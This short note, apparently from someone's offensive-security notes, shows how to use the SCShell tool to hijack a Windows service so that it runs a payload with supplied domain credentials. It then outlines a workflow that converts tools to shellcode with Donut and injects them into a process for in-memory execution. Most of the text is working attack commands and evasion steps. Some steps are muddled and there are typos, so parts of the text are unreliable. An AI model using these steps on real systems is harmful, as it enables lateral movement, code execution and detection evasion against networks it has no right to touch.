https://github.com/Mr-Un1k0d3r/SCShell

```

ScShell.exe local MyService C:\\payload.exe C:\\error.log MYDOMAIN myuser mypassword

```

This command will:
Connect to the local machine.
Target the service ned MyService.
Set the service to run payload.exe.
Log the output and errors to error.log.
Use the specified domain, userne, and password for authentication.

Important Considerations:
Permissions: You need appropriate permissions to modify and start services. 

Administrative privileges are typically required.

```
ScShell.exe local MyService C:\\payload.exe C:\\error.log MYDOMAIN myuser mypassword
```

### **Full Workflow** Recap:
1. **Convert scshell with arguments to shellcode** using Donut.
   ```bash
   donut -f 1 -a "args_for_scshell" scshell.exe
   ```
2. **Convert service.exe to shellcode** using Donut.
   ```bash
   donut -f 1 service.exe
   ```
3. **Inject the scshell shellcode** into a process using a process injection technique (e.g., CreateRemoteThread, process hollowing).
4. **scshell shellcode executes the service.exe shellcode**, performing the reflective execution in memory.